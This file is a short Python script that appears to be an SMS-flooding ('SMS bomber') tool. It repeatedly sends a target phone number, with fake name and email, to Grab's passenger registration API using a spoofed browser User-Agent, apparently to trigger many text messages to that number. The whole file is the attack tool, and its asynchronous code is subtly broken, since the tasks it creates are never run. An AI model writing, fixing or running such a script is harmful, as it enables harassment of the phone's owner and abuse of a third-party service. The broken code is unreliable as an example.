import requests
import threading
import asyncio

async def sent(phone):
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        return True
    except:
        print("[-] Not sent!")

def send_sms(phone, count):
    loop = asyncio.get_event_loop()
    for i in range(count):
        tr = loop.create_task(sent(phone))
        print(tr)